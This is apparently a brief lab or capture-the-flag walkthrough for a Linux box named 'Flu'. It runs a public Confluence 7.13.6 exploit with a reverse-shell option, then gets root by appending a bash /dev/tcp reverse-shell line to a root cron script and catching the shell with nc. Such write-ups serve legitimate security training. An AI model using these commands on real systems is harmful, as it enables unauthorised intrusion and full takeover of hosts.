# Flu (Linux)

## Initial Foothold

Atlassian Confluence 7.13.6 exploit ([github.com/jbaines-r7/through_the_wire](https://github.com/jbaines-r7/through_the_wire))
```bash
python3 through_the_wire.py --rhost 192.168.110.41 --rport 8090 --lhost 192.168.45.166 --protocol http:// --reverse-shell
```

## Privilege Escalation

Checked with linpeas.sh, found nothing.  
Used pspy32s and noticed root was running `/opt/log-backup.sh`.
Appended a reverse shell command:
```bash
echo "bash -i >& /dev/tcp/192.168.45.166/80 0>&1" >> /opt/log-backup.sh
```
Started a listener:
```bash
nc -nlvp 80
```
Root shell received when cron ran the script.
